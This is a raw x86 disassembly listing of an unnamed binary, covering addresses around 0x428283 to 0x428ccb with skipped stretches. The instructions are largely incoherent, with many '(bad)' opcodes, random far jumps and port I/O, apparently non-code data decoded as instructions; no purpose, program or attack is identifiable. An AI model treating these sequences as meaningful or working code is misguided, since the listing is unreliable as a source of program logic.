  428283:	test   eax,0x65572d9d
  428288:	push   0xd39bf97b
  42828d:	dec    esi
  42828e:	pop    esi
  42828f:	mov    DWORD PTR [eax],eax
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	sbb    dh,BYTE PTR [ebx-0x15]
  428303:	pop    esp
  428304:	cmp    al,0xad
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	ret    
  42830d:	dec    ebx
  42830e:	xor    eax,0x439c0261
  428313:	enter  0x83a8,0x4a
  428317:	jp     0x4282ae
  428319:	mov    dh,0x31
  42831b:	xchg   esp,eax
  42831c:	(bad)  
  42831e:	and    bh,BYTE PTR [ebx+0x20]
  428321:	cmp    al,0x14
  428323:	aaa    
  428324:	dec    eax
  428325:	cs jl  0x428304
  428328:	dec    ebp
  428329:	add    ah,cl
  42832b:	pop    es
  42832c:	adc    al,0x59
  42832e:	fld    DWORD PTR [edi+0x33]
  428331:	hlt    
  428332:	xor    BYTE PTR [ecx+0x10],0x74
  428336:	push   ebx
  428337:	jecxz  0x4283b1
  428339:	pusha  
  42833a:	sti    
  42833b:	fild   DWORD PTR [eax-0x73]
  42833e:	xchg   ebx,eax
  42833f:	fldenv [ecx]
  428341:	mov    edx,0x59a523c3
  428346:	jl     0x4283bb
  428348:	mov    al,ds:0xca737571
  42834d:	repnz lea esi,[ebx+0x67942da4]
  428354:	mov    bl,0x41
  428356:	imul   edx,DWORD PTR [esi-0x45],0xffffffef
  42835a:	ret    0xca86
  42835d:	test   DWORD PTR [eax-0x432bc6af],0x34f418af
  428367:	stos   DWORD PTR es:[edi],eax
  428368:	mov    BYTE PTR [eax-0x7c167e53],0xd8
  42836f:	fadd   DWORD PTR [ebx-0x2a]
  428372:	mov    edx,DWORD PTR [ebp-0x35706752]
  428378:	push   ebx
  428379:	xchg   ebp,eax
  42837a:	dec    edi
  42837b:	not    ecx
  42837d:	mov    bh,0x15
  42837f:	ret    
  428380:	and    DWORD PTR ds:0x288778a7,esp
  428386:	xchg   esi,eax
  428387:	and    DWORD PTR [eax+eiz*1-0x72],ecx
  42838b:	add    BYTE PTR [eax-0x23],dl
  42838e:	leave  
  42838f:	adc    al,0x5
  428391:	fs mov dh,0x82
  428394:	add    BYTE PTR [edx],bl
  428396:	sub    ah,BYTE PTR [esi+0x64]
  428399:	and    bh,ch
  42839b:	(bad)  
  42839c:	std    
  42839d:	add    eax,0x2d8d9620
  4283a2:	dec    esp
  4283a3:	sub    dh,0xa9
  4283a6:	xor    eax,0x8a5c4602
  4283ab:	pushf  
  4283ac:	sahf   
  4283ad:	mov    al,ds:0xf220abb9
  4283b2:	fld    DWORD PTR [eax]
  4283b4:	or     DWORD PTR [ebp-0x5a5425dd],edi
  4283ba:	arpl   bx,di
  4283bc:	pop    ss
  4283bd:	bound  ebx,QWORD PTR [ebx-0x47]
  4283c0:	inc    esp
  4283c1:	das    
  4283c2:	dec    esi
  4283c3:	sar    DWORD PTR [eax+0x4947d540],cl
  4283c9:	jne    0x428382
  4283cb:	js     0x42839f
  4283cd:	out    dx,al
  4283ce:	xchg   edi,eax
  4283cf:	push   0x40
  4283d1:	ss arpl dx,cx
  4283d4:	inc    ebp
  4283d5:	lods   eax,DWORD PTR ds:[esi]
  4283d6:	sar    dl,cl
  4283d8:	js     0x428440
  4283da:	push   ecx
  4283db:	xor    al,0x19
  4283de:	add    al,0x9f
  4283e0:	outs   dx,DWORD PTR ds:[esi]
  4283e1:	js     0x42838c
  4283e3:	add    BYTE PTR [ebp-0xe24a758],cl
  4283e9:	xchg   edi,eax
  4283ea:	lea    ebp,[ebp-0x6f]
  4283ed:	and    bl,BYTE PTR [ecx+0x3b]
  4283f0:	in     al,dx
  4283f1:	cmp    BYTE PTR [edi-0x1697fe39],ah
  4283f7:	fsub   QWORD PTR [edx-0x3122c720]
  4283fd:	scas   al,BYTE PTR es:[edi]
  4283fe:	add    DWORD PTR [eax-0x8],edx
  428401:	mov    ch,BYTE PTR [esi+0x25]
  428404:	or     al,0xc0
  428406:	daa    
  428407:	and    eax,0xbab1a9c0
  42840c:	or     edx,DWORD PTR [ebx+edx*4+0x8]
	...
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xa6abfb32
  428481:	jns    0x428463
  428483:	sub    DWORD PTR [eax-0x52],eax
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	cmp    eax,0xa8c11263
  428491:	je     0x4284d2
  428493:	or     al,0xfc
  428495:	xor    BYTE PTR [edi],ch
  428497:	sar    DWORD PTR [edi],0x91
  42849a:	add    BYTE PTR [ebp+esi*8+0x42a194e0],0xff
  4284a2:	jbe    0x428457
  4284a4:	sub    ch,BYTE PTR [esi+0x2e]
  4284a7:	xor    BYTE PTR [ebp+0x4646b2b8],ch
  4284ad:	cmp    DWORD PTR ds:0x8051480f,esi
  4284b3:	ret    0xdce6
  4284b6:	cwde   
  4284b7:	add    DWORD PTR [edx-0x6f],ebx
  4284ba:	fbstp  TBYTE PTR [ecx]
  4284bc:	push   0x27
  4284be:	call   0x220d:0x18b2129c
  4284c5:	jb     0x4284d0
  4284c7:	sbb    ah,BYTE PTR [edi+edi*4+0x2ba232a0]
  4284ce:	stos   BYTE PTR es:[edi],al
  4284cf:	leave  
  4284d0:	inc    DWORD PTR [esi-0x69]
  4284d3:	ret    0x50ac
  4284d6:	xor    BYTE PTR [eax],bl
  4284d8:	lods   al,BYTE PTR ds:[esi]
  4284d9:	adc    DWORD PTR [edx],esp
  4284db:	jns    0x4284c6
  4284dd:	inc    ecx
  4284de:	pop    ebp
  4284df:	push   0x4c806d42
  4284e4:	shl    BYTE PTR cs:[edx-0x1e721bf3],cl
  4284eb:	fstp   QWORD PTR [edi+0x76]
  4284ee:	xor    bl,bl
  4284f0:	repz or edi,eax
  4284f3:	or     DWORD PTR [eax+edx*8-0x54da0deb],esp
  4284fa:	stc    
  4284fb:	cdq    
  4284fc:	mov    ds:0xdfa661a4,eax
  428501:	push   0x9
  428503:	outs   dx,BYTE PTR ds:[esi]
  428504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428505:	or     eax,0xaa8ca8f3
  42850a:	xchg   ebp,eax
  42850b:	adc    DWORD PTR [esi-0x5],ebp
  42850e:	lods   al,BYTE PTR es:[esi]
  428510:	adc    BYTE PTR ds:[esi+ecx*8],cl
  428514:	push   ebx
  428515:	mov    ds:0x7ca613e8,eax
  42851a:	adc    al,0x55
  42851c:	retf   0x74ad
  42851f:	clc    
  428520:	xchg   ebp,eax
  428521:	push   ecx
  428522:	jle    0x4284af
  428524:	sub    eax,0xfb3a2df9
  428529:	mov    cl,al
  42852b:	add    BYTE PTR [ecx],cl
  42852d:	stos   BYTE PTR es:[edi],al
  42852e:	imul   DWORD PTR [edx+0x45]
  428531:	fild   WORD PTR [ebx+0x41cabd29]
  428537:	fs pop esp
  428539:	or     bh,al
  42853b:	jbe    0x428559
  42853d:	xchg   edi,eax
  42853e:	pop    edi
  42853f:	outs   dx,BYTE PTR ds:[esi]
  428540:	mov    ecx,0x716989b2
  428545:	dec    ebx
  428546:	sbb    ecx,ecx
  428548:	ficom  WORD PTR [esi]
  42854a:	xchg   esp,eax
  42854b:	pushf  
  42854c:	jle    0x428515
  42854e:	push   esp
  42854f:	sbb    DWORD PTR [edi-0xa2508b2],esp
  428555:	cmp    eax,0x80b6a0c4
  42855a:	ds fs sbb ax,0xa1de
  428560:	imul   esi,DWORD PTR [ebx],0xeeb6ed73
  428566:	xchg   esp,eax
  428567:	add    DWORD PTR [edx+ebp*2],esp
  42856a:	inc    esp
  42856b:	out    0x21,al
  42856d:	std    
  42856e:	mov    ds:0xb6097bcd,eax
  428573:	xchg   BYTE PTR [ecx+eax*1],dh
  428576:	pavgw  mm5,QWORD PTR [ebx]
  428579:	dec    edx
  42857a:	xor    dh,BYTE PTR [edx-0x4d]
  42857d:	nop
  42857e:	test   al,0xc8
  428580:	outs   dx,DWORD PTR ds:[esi]
  428581:	cli    
  428582:	push   ebp
  428583:	ja     0x42858e
  428585:	mov    DWORD PTR [edi-0x27],eax
  428588:	push   ss
  428589:	shr    BYTE PTR [esi],0x2c
  42858c:	ins    BYTE PTR es:[edi],dx
  42858d:	push   edx
  42858e:	out    0xcf,al
	...
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x48dea3f6
  428602:	adc    esp,DWORD PTR [ebp+0x44]
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	and    edi,esp
  42860e:	outs   dx,DWORD PTR ds:[esi]
  42860f:	xchg   ebx,eax
  428610:	lock adc ebp,edi
  428613:	xchg   DWORD PTR [edi-0x33],esp
  428616:	aas    
  428617:	daa    
  428618:	sub    DWORD PTR [edi+esi*8+0x9],ebx
  42861c:	mov    esp,DWORD PTR [ebx-0x1b]
  42861f:	jbe    0x4285de
  428621:	ja     0x428638
  428623:	adc    bh,cl
  428625:	jmp    FWORD PTR [edx]
  428627:	(bad)
  42862a:	iret   
  42862b:	cs fwait
  42862d:	mov    dl,0xad
  42862f:	push   ebp
  428630:	pusha  
  428631:	or     BYTE PTR [ebx+0x4805334d],bh
  428637:	ficomp WORD PTR [edx+edi*2+0x1a]
  42863b:	jb     0x428663
  42863d:	dec    eax
  42863e:	mov    esi,0xd23964b6
  428643:	call   0xcf8b8d1b
  428648:	aas    
  428649:	cmp    bl,BYTE PTR [eax-0x2c]
  42864c:	xchg   esp,eax
  42864d:	or     bh,BYTE PTR [eax+0x61]
  428650:	cmc    
  428651:	sbb    al,0xed
  428653:	inc    ebp
  428654:	add    DWORD PTR [ecx],esi
  428656:	mov    ds:0x268377a,al
  42865b:	ret    0x1b3
  42865e:	shr    BYTE PTR [ebp+0x75870ab4],0xe8
  428665:	xor    BYTE PTR ds:0xe1203b42,dh
  42866b:	sbb    bl,BYTE PTR [ecx-0x583cddc9]
  428671:	xchg   ecx,eax
  428672:	jbe    0x428672
  428674:	jno    0x42866d
  428676:	fsubr  DWORD PTR ds:[esi]
  428679:	xor    BYTE PTR [esi-0x20],0x59
  42867d:	cwde   
  42867e:	mov    WORD PTR [eax],ss
  428680:	jae    0x4286c9
  428682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428683:	aas    
  428684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428685:	and    DWORD PTR [edx+ecx*2],edx
  428688:	mov    eax,0x14e16c50
  42868d:	sub    esi,DWORD PTR [ecx]
  42868f:	arpl   WORD PTR [edx],si
  428691:	pop    ebp
  428692:	or     DWORD PTR [eax-0x3e150d80],0x6fa45264
  42869c:	push   es
  42869d:	add    ah,BYTE PTR [eax-0x5560dc2c]
  4286a3:	cli    
  4286a4:	out    dx,al
  4286a5:	test   edx,esp
  4286a7:	xchg   ebx,eax
  4286a8:	fmul   st(1),st
  4286aa:	xchg   esp,eax
  4286ab:	pop    ebp
  4286ac:	dec    ebx
  4286ad:	jae    0x4286c0
  4286af:	mov    gs,WORD PTR [edx+0x3f]
  4286b2:	and    BYTE PTR [ecx-0x31],ah
  4286b5:	dec    ebp
  4286b6:	sub    BYTE PTR [edi+0x62],0x64
  4286ba:	or     eax,0x8ecf3b02
  4286bf:	vmread esp,eax
  4286c2:	xchg   ebx,eax
  4286c3:	rcr    DWORD PTR ds:0xb9cc5eb9,1
  4286c9:	mov    ebx,0xc03b878a
  4286ce:	xchg   ebx,eax
  4286cf:	jmp    0xf4f2763
  4286d4:	sub    ebp,DWORD PTR [ebp-0x12]
  4286d7:	push   ss
  4286d8:	push   esp
  4286d9:	out    0x84,al
  4286db:	call   0xe29c:0xbfcca816
  4286e2:	in     al,dx
  4286e3:	enter  0x63b2,0x3b
  4286e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286e8:	shr    DWORD PTR [edx+ecx*4],1
  4286eb:	sahf   
  4286ec:	dec    ebx
  4286ed:	jo     0x428742
  4286ef:	mov    esp,DWORD PTR [esi+0x48173aa7]
  4286f5:	or     eax,ecx
  4286f7:	ret    0x2d1a
  4286fa:	or     al,0xaf
  4286fc:	in     al,dx
  4286fd:	mov    esi,0xb722bceb
  428702:	sub    BYTE PTR [ebp+0x48],bl
  428705:	xor    ah,BYTE PTR [ecx+0x63]
  428708:	cli    
  428709:	dec    esi
  42870a:	push   es
  42870b:	mov    ebx,0x9fe3fec0
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x394cce96
  428783:	loop   0x4287cd
  428785:	mov    al,0x1
  428787:	add    BYTE PTR [ecx+eax*1],al
  42878a:	add    BYTE PTR [eax],al
  42878c:	pcmpeqb mm7,QWORD PTR [edi-0x1c4feb1b]
  428793:	push   ecx
  428794:	bound  esi,QWORD PTR [edi]
  428796:	pusha  
  428797:	add    ebx,DWORD PTR [esi]
  428799:	push   ss
  42879a:	jne    0x4287d7
  42879c:	(bad)  
  42879d:	rol    DWORD PTR [eax],cl
  42879f:	dec    eax
  4287a0:	in     eax,dx
  4287a1:	shr    BYTE PTR [eax-0x6b],1
  4287a4:	jbe    0x42881f
  4287a6:	mov    ds:0x3bcec725,eax
  4287ab:	pop    ebp
  4287ac:	cmp    DWORD PTR [edi],ecx
  4287ae:	loope  0x428754
  4287b0:	cs rcl bl,0x0
  4287b4:	dec    ebp
  4287b5:	sub    esi,ecx
  4287b7:	ins    BYTE PTR es:[edi],dx
  4287b8:	repz dec esi
  4287ba:	mov    edx,0x7dee4459
  4287bf:	inc    esi
  4287c0:	sbb    BYTE PTR [eax],dl
  4287c2:	mov    ch,BYTE PTR [edx]
  4287c4:	fdivr  st(1),st
  4287c6:	push   ecx
  4287c7:	(bad)  
  4287c8:	mov    dh,al
  4287ca:	out    dx,al
  4287cb:	gs jns 0x42881e
  4287ce:	jge    0x428787
  4287d0:	pusha  
  4287d1:	retf   0xa411
  4287d4:	inc    ch
  4287d6:	jae    0x428821
  4287d8:	mov    edx,?
  4287da:	popf   
  4287db:	cmp    BYTE PTR [ecx-0x65fc1571],ah
  4287e1:	and    edx,DWORD PTR [ebp+edi*8-0x3]
  4287e5:	pop    ebp
  4287e6:	push   ebp
  4287e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287e8:	jecxz  0x42884a
  4287ea:	cli    
  4287eb:	pop    ebp
  4287ec:	imul   esi,ecx,0x34
  4287ef:	fmul   QWORD PTR [esi-0x28]
  4287f2:	outs   dx,BYTE PTR ds:[esi]
  4287f3:	xor    al,0x56
  4287f5:	sub    bl,BYTE PTR [eax+0x4d]
  4287f8:	add    al,bl
  4287fa:	pop    ss
  4287fb:	inc    esi
  4287fc:	(bad)  
  4287fd:	out    dx,al
  4287fe:	aas    
  4287ff:	and    al,BYTE PTR [ecx-0x4]
  428802:	jle    0x4287ef
  428804:	outs   dx,DWORD PTR ds:[esi]
  428805:	nop
  428806:	scas   al,BYTE PTR es:[edi]
  428807:	idiv   cl
  428809:	and    BYTE PTR [edx+0x78],al
  42880c:	je     0x428796
  42880e:	add    DWORD PTR [edi-0x5e72ee40],ebp
  428814:	addr16 or eax,0x75550aaa
  42881a:	mov    dl,ch
  42881c:	xchg   edx,eax
  42881d:	sar    BYTE PTR gs:[edx-0x40],cl
  428821:	dec    eax
  428822:	pop    edx
  428823:	je     0x4288a1
  428825:	out    dx,al
  428826:	mov    cl,cl
  428828:	jl     0x428839
  42882a:	scas   eax,DWORD PTR es:[edi]
  42882b:	mov    al,0xcb
  42882d:	lahf   
  42882e:	mov    DWORD PTR [edx+0x37],ecx
  428831:	fimul  WORD PTR [edi+ebx*2-0x54b12957]
  428838:	rcr    BYTE PTR [edx-0x4e],0xe0
  42883c:	in     al,0x77
  42883e:	and    al,0x81
  428840:	lds    ebx,FWORD PTR [eax+0x2d42b09]
  428846:	leave  
  428847:	xchg   ecx,eax
  428848:	mov    esi,0x4d8ed4dd
  42884d:	test   BYTE PTR [edx-0x41b02ae8],ah
  428853:	and    BYTE PTR [edi-0x4b],bl
  428856:	dec    edx
  428857:	stos   DWORD PTR es:[edi],eax
  428858:	add    eax,0x3d8f84c6
  42885d:	push   es
  42885e:	loopne 0x428873
  428860:	push   cs
  428861:	pop    ss
  428862:	or     edi,DWORD PTR [ecx+eiz*2-0x672f14e7]
  428869:	jecxz  0x4287fc
  42886b:	dec    esp
  42886c:	in     eax,dx
  42886d:	repnz daa 
  42886f:	fsubr  DWORD PTR [ebx-0x49]
  428872:	and    al,0x53
  428874:	leave  
  428875:	pop    ebx
  428876:	mov    edx,0x1c124efe
  42887b:	std    
  42887c:	test   DWORD PTR ss:[eax+ebp*1],edi
  428880:	jnp    0x4288a1
  428882:	sub    BYTE PTR [ebp+0x76],0x55
  428886:	jno    0x428873
  428888:	imul   esp,edi,0x633bb4b6
  42888e:	xor    esp,edi
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi+0x2ac39d0f],bx
  428902:	lods   al,BYTE PTR ds:[esi]
  428903:	(bad)  
  428904:	dec    esp
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	cmp    bh,BYTE PTR [ebx]
  42890e:	ja     0x42898f
  428910:	arpl   WORD PTR [esi-0x62],si
  428913:	retf   
  428914:	pop    eax
  428915:	mov    bh,BYTE PTR [esi]
  428917:	fwait
  428918:	in     al,0xd0
  42891a:	xchg   ecx,eax
  42891b:	add    BYTE PTR [ebx-0x2ebabe1],cl
  428921:	jl     0x42894b
  428923:	mov    eax,ds:0xf6a1f1d9
  428928:	outs   dx,BYTE PTR ds:[esi]
  428929:	ins    DWORD PTR es:[edi],dx
  42892a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42892b:	adc    al,0x68
  42892d:	jge    0x428900
  42892f:	push   edi
  428930:	pop    ebp
  428931:	imul   esp,DWORD PTR [edi-0x6849cfb0],0x60
  428938:	test   al,dh
  42893a:	in     al,dx
  42893b:	call   0x84cf:0xdba3d515
  428942:	fcos   
  428944:	cli    
  428945:	enter  0x2c36,0x97
  428949:	enter  0x5b92,0x7
  42894d:	je     0x4289c3
  42894f:	and    DWORD PTR [edx-0x6386de5a],ebp
  428955:	mov    bh,0x23
  428957:	hlt    
  428958:	sub    bl,BYTE PTR [ebx-0x12]
  42895b:	mov    eax,ds:0xca52dae3
  428960:	sub    eax,0x2e012662
  428965:	vpacksswb ymm2,ymm5,YMMWORD PTR [esi-0x12]
  42896a:	out    dx,al
  42896b:	fcomp  st(0)
  42896d:	lods   eax,DWORD PTR ds:[esi]
  42896e:	or     bl,cl
  428970:	push   ebx
  428971:	cmp    eax,DWORD PTR [ecx+0x5ca8ec46]
  428977:	mov    ds:0x2ac988cd,eax
  42897c:	test   DWORD PTR ds:0x54a7389b,0xe7baca80
  428986:	hlt    
  428987:	cmc    
  428988:	mov    esi,0xcda55ec5
  42898d:	(bad)  
  42898e:	sbb    cl,dh
  428990:	loop   0x4289c6
  428992:	in     al,0x1f
  428994:	scas   al,BYTE PTR es:[edi]
  428995:	adc    ah,BYTE PTR [ecx]
  428997:	mov    bh,0x22
  428999:	fucomi st,st(5)
  42899b:	fadd   QWORD PTR [esi+0x2c]
  42899e:	call   0x5f16eae8
  4289a3:	(bad)  
  4289a4:	and    eax,0xc6cab47c
  4289a9:	call   0xc866a4ab
  4289ae:	pop    eax
  4289af:	scas   eax,DWORD PTR es:[edi]
  4289b0:	push   ds
  4289b1:	mov    ah,0x42
  4289b3:	mov    eax,DWORD PTR [esi+0x5fd31c6b]
  4289b9:	add    BYTE PTR [eax+0x16],ch
  4289bc:	mov    ds:0x77f5fe6f,al
  4289c1:	xchg   ebx,eax
  4289c2:	and    al,0x3
  4289c4:	sub    edx,DWORD PTR [edi+0xb]
  4289c7:	xchg   esi,eax
  4289c8:	add    al,0x30
  4289ca:	sub    DWORD PTR [eax-0x1ab43503],esi
  4289d0:	lahf   
  4289d1:	jae    0x428981
  4289d3:	fimul  WORD PTR [ecx]
  4289d5:	dec    edx
  4289d6:	les    esp,FWORD PTR [esp+eax*2+0x3eeeabcb]
  4289dd:	jo     0x428a51
  4289df:	inc    edi
  4289e0:	aad    0xe5
  4289e2:	xchg   esp,eax
  4289e3:	mov    cl,0xd8
  4289e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289e6:	push   0x64
  4289e8:	lods   eax,DWORD PTR ds:[esi]
  4289e9:	rcl    DWORD PTR [esi],cl
  4289eb:	push   edx
  4289ec:	mov    ebx,0x50697246
  4289f1:	adc    ebx,DWORD PTR [edx]
  4289f3:	in     al,dx
  4289f4:	int    0x89
  4289f6:	mov    dl,0xe0
  4289f8:	adc    ebx,DWORD PTR ss:[ebp+0x25]
  4289fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289fd:	pusha  
  4289fe:	shr    al,cl
  428a00:	jnp    0x428a40
  428a02:	sbb    dh,BYTE PTR [ebp-0x73a257e]
  428a08:	pop    ebx
  428a09:	hlt    
  428a0a:	lock cmp al,0x44
  428a0d:	jnp    0x428a7d
  428a0f:	into   
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x45e13413]
  428a83:	in     eax,dx
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	push   esi
  428a8d:	fwait
  428a8e:	imul   edx,edi,0x5e
  428a91:	xchg   ecx,eax
  428a92:	scas   eax,DWORD PTR es:[edi]
  428a93:	cmp    BYTE PTR [ecx],ch
  428a95:	dec    esp
  428a96:	lahf   
  428a97:	mov    ebp,0x292fc24e
  428a9c:	sbb    eax,0x20ad990f
  428aa1:	int3   
  428aa2:	imul   esi,ebx,0xdc2b0ff7
  428aa8:	adc    al,BYTE PTR [esi-0x5e]
  428aab:	push   edi
  428aac:	mov    BYTE PTR [esp+eiz*2-0x4c70d960],bh
  428ab3:	(bad)  
  428ab4:	dec    ebx
  428ab5:	add    eax,DWORD PTR [ebp+0x6b]
  428ab8:	out    0x40,eax
  428aba:	rcr    DWORD PTR [ebx+0x35657338],cl
  428ac0:	push   eax
  428ac1:	adc    BYTE PTR [esi],ch
  428ac3:	aaa    
  428ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ac5:	add    BYTE PTR ds:0x8710b50c,ch
  428acb:	clc    
  428acc:	xchg   ebp,eax
  428acd:	add    BYTE PTR [edi+ebp*2+0x1e],ch
  428ad1:	fistp  QWORD PTR [ecx+0x4]
  428ad4:	sbb    ebp,ecx
  428ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ad7:	add    al,0x26
  428ad9:	dec    BYTE PTR [ecx-0x47e649b0]
  428adf:	mov    ebp,edx
  428ae1:	pop    ebx
  428ae2:	retf   0xf54f
  428ae5:	jmp    0x6d56:0x61635df6
  428aec:	imul   ebx,DWORD PTR [ecx],0x61
  428aef:	or     edx,DWORD PTR [eax-0x1253bed8]
  428af5:	test   BYTE PTR [ecx+ecx*4+0x2d],ah
  428af9:	jle    0x428b65
  428afb:	inc    ebp
  428afc:	lods   eax,DWORD PTR ds:[esi]
  428afd:	shl    DWORD PTR [ecx-0x4a],1
  428b00:	pop    esi
  428b01:	pop    es
  428b02:	inc    eax
  428b03:	scas   al,BYTE PTR es:[edi]
  428b04:	jb     0x428b09
  428b06:	xchg   edx,eax
  428b07:	mov    edi,0x94a44973
  428b0c:	cmp    al,0x92
  428b0e:	jo     0x428ab1
  428b10:	hlt    
  428b11:	pop    ebx
  428b12:	dec    ebx
  428b13:	push   es
  428b14:	out    0x57,al
  428b16:	and    dl,ah
  428b18:	loop   0x428b38
  428b1a:	adc    DWORD PTR [ebp+0x75a449dc],ebx
  428b20:	sbb    BYTE PTR [eax+edx*4],0x80
  428b24:	dec    ebx
  428b25:	test   eax,0x8f791a6e
  428b2a:	jne    0x428b5f
  428b2c:	sbb    eax,DWORD PTR [edx]
  428b2e:	js     0x428ae1
  428b30:	imul   ecx,DWORD PTR [ebx+0x1a],0xffffffaa
  428b34:	shl    BYTE PTR [ecx+0x14],cl
  428b37:	ins    BYTE PTR es:[edi],dx
  428b38:	xchg   esi,eax
  428b39:	(bad)  
  428b3a:	jg     0x428b1e
  428b3c:	(bad)  
  428b3d:	rcl    BYTE PTR [edi],cl
  428b3f:	je     0x428b57
  428b41:	mov    bh,0x7b
  428b43:	nop
  428b44:	inc    eax
  428b45:	(bad)
  428b49:	dec    ecx
  428b4a:	call   0x15c0a9d
  428b4f:	dec    ebp
  428b50:	push   ds
  428b51:	push   eax
  428b52:	xchg   ecx,eax
  428b53:	adc    dh,BYTE PTR [ecx+0x4e]
  428b56:	xor    eax,0xfbda0a75
  428b5b:	js     0x428af6
  428b5d:	and    DWORD PTR [edx-0x301a4b31],esp
  428b63:	nop
  428b64:	(bad)  [ebx+ebp*8-0x3e9dfe54]
  428b6b:	ret    
  428b6c:	adc    al,0x69
  428b6e:	idiv   cl
  428b70:	lds    esi,FWORD PTR [esi]
  428b72:	out    dx,al
  428b73:	mov    ecx,0x4ea690cb
  428b78:	push   ebx
  428b79:	(bad)  
  428b7a:	cmp    ecx,ebx
  428b7c:	das    
  428b7d:	imul   BYTE PTR [ecx-0x69]
  428b80:	in     al,0x40
  428b82:	sub    ch,ch
  428b84:	lea    esi,[edi-0x9]
  428b87:	mov    eax,0xf128186e
  428b8c:	jnp    0x428b57
  428b8e:	mov    esp,0x6e
	...
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x20aa83d3
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	aas    
  428c0d:	adc    al,0x8
  428c0f:	add    BYTE PTR [esi+0x7d0b9237],0xe1
  428c16:	fdivr  DWORD PTR [edi+eax*2]
  428c19:	ds cwde 
  428c1b:	outs   dx,DWORD PTR ds:[esi]
  428c1c:	cmp    DWORD PTR [esi+ecx*8-0x4f],ecx
  428c20:	jae    0x428c82
  428c22:	sbb    bl,BYTE PTR [eax-0x216a0056]
  428c28:	sub    DWORD PTR [ebx+esi*2],esi
  428c2b:	ret    
  428c2c:	adc    al,0xfa
  428c2e:	(bad)  
  428c2f:	fimul  DWORD PTR ds:0xb6ce25ee
  428c35:	xor    eax,0x1bf5ae66
  428c3a:	jne    0x428c3e
  428c3c:	aaa    
  428c3d:	test   DWORD PTR [edi],edx
  428c3f:	ud0    edx,DWORD PTR [ecx+0x58]
  428c43:	jle    0x428c5c
  428c45:	push   ss
  428c46:	and    al,0x43
  428c48:	ins    BYTE PTR es:[edi],dx
  428c49:	add    DWORD PTR [ebp+0xd],edx
  428c4c:	ret    
  428c4d:	adc    eax,0x77b02b5d
  428c52:	pop    ebp
  428c53:	scas   al,BYTE PTR es:[di]
  428c55:	xchg   dh,ah
  428c57:	in     al,dx
  428c58:	dec    ecx
  428c59:	or     eax,0xfa001442
  428c5e:	adc    eax,0x39e493f5
  428c63:	mov    ds,WORD PTR [ebp+0x12]
  428c66:	in     eax,0xb6
  428c68:	nop
  428c69:	xchg   BYTE PTR [edx],ah
  428c6b:	mov    ebp,0xbbc39595
  428c70:	jmp    0x350a5c9b
  428c75:	or     ch,bh
  428c77:	out    dx,eax
  428c78:	xchg   ebx,eax
  428c79:	adc    bl,BYTE PTR [ebp+0x78]
  428c7c:	sbb    bl,al
  428c7e:	xlat   BYTE PTR ds:[ebx]
  428c7f:	cmp    DWORD PTR [ebx],ecx
  428c81:	xchg   DWORD PTR [edx+0x77],esi
  428c84:	ja     0x428c4f
  428c86:	inc    ebx
  428c87:	pop    edi
  428c88:	or     BYTE PTR [esi+0x71636f24],0xeb
  428c8f:	sbb    DWORD PTR ds:[eax+0x6f],ebp
  428c93:	scas   eax,DWORD PTR es:[edi]
  428c94:	sub    BYTE PTR [edx],dl
  428c96:	loop   0x428cc3
  428c98:	ss inc edx
  428c9a:	or     dh,dh
  428c9c:	push   ecx
  428c9d:	mov    al,ds:0x65312bf1
  428ca2:	les    esp,FWORD PTR [ebp+eax*1-0x546698e1]
  428ca9:	repnz mov ah,0xd2
  428cac:	inc    ebx
  428cad:	sbb    dl,BYTE PTR [edi]
  428caf:	push   ebx
  428cb0:	(bad)  
  428cb1:	adc    DWORD PTR [esi-0x6f],ebx
  428cb4:	push   ds
  428cb5:	sub    BYTE PTR [eax+ebx*4],dh
  428cb8:	(bad)  ss:[ecx]
  428cbb:	jmp    0x8eb1729
  428cc0:	aaa    
  428cc1:	mov    BYTE PTR [edi],dl
  428cc3:	aad    0x7e
  428cc5:	sub    DWORD PTR [esi-0x465446db],edx
  428ccb:	fdivr  st,st(4)
